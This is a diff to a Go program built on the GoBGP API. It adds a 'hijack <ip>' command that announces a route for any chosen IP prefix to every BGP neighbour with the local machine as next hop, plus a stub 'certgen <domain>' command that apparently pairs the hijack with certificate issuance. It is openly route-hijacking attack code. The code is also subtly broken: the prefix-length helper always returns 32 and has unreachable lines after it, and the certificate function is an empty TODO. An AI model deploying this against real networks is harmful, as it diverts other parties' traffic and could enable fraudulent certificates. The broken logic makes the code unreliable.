@@ -104,11 +104,34 @@ func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
 	return nil
 }
 
-func hijackRoutes(client api.GobgpApiClient, ctx context.Context) error {
+func determinePrefixLength(ip string) (uint32, error) {
+	// Check if it's an IPv4 address
+	return 32, nil
+	return 0, fmt.Errorf("invalid IP address format: %s", ip)
+}
+
+func hijackRoutes(client api.GobgpApiClient, ctx context.Context, targetIP string, prefixLenOverride ...uint32) error {
+	// Using automatic prefix length determination
+	// hijackRoutes(client, ctx, "192.168.1.0")
+	// Using a specific prefix length
+	// hijackRoutes(client, ctx, "192.168.1.0", 16)
+	
 	// Get BGP neighbors
 	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
 	if err != nil {
 		return fmt.Errorf("failed to get neighbors: %v", err)
+	}
+
+	// Determine prefix length for the target IP
+	var prefixLen uint32
+	var err2 error
+	if len(prefixLenOverride) > 0 {
+		prefixLen = prefixLenOverride[0]
+	} else {
+		prefixLen, err2 = determinePrefixLength(targetIP)
+		if err2 != nil {
+			return fmt.Errorf("failed to determine prefix length: %v", err2)
+		}
 	}
 
 	fmt.Println("BGP Neighbors:")
@@ -123,19 +146,26 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context) error {
 			peer.Peer.State.SessionState)
 
 		// Add a new route using our local address as next-hop
-		err = addRoute(client, ctx, "10.0.0.0", 24, peer.Peer.Transport.LocalAddress)
+		err = addRoute(client, ctx, targetIP, prefixLen, peer.Peer.Transport.LocalAddress)
 		if err != nil {
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
 
-		fmt.Println("Route added successfully to ", peer.Peer.Conf.NeighborAddress)
+		fmt.Printf("Route added successfully to %s (prefix length: /%d)\n", 
+			peer.Peer.Conf.NeighborAddress, prefixLen)
 	}
+	return nil
+}
+
+func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string) error {
+	// TODO: Implement certificate generation logic
+	fmt.Printf("Generating certificate for domain: %s\n", domain)
 	return nil
 }
 
 func main() {
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack  - Add hijack route")
+		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip>  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
 	}
 
 	// Connect to GoBGP daemon
@@ -157,11 +187,24 @@ func main() {
 		fmt.Println("Route cleared successfully")
 
 	case "hijack":
-		if err := hijackRoutes(client, ctx); err != nil {
+		if len(os.Args) < 3 {
+			log.Fatal("Usage: go run main.go hijack <ip>")
+		}
+		targetIP := os.Args[2]
+		if err := hijackRoutes(client, ctx, targetIP); err != nil {
 			log.Fatalf("Failed to hijack routes: %v", err)
 		}
 
+	case "certgen":
+		if len(os.Args) < 3 {
+			log.Fatal("Usage: go run main.go certgen <domain>")
+		}
+		domain := os.Args[2]
+		if err := generateCertificate(client, ctx, domain); err != nil {
+			log.Fatalf("Failed to generate certificate: %v", err)
+		}
+
 	default:
-		log.Fatal("Unknown command. Available commands: clear, hijack")
+		log.Fatal("Unknown command. Available commands: clear, hijack <ip>, certgen <domain>")
 	}
 } 
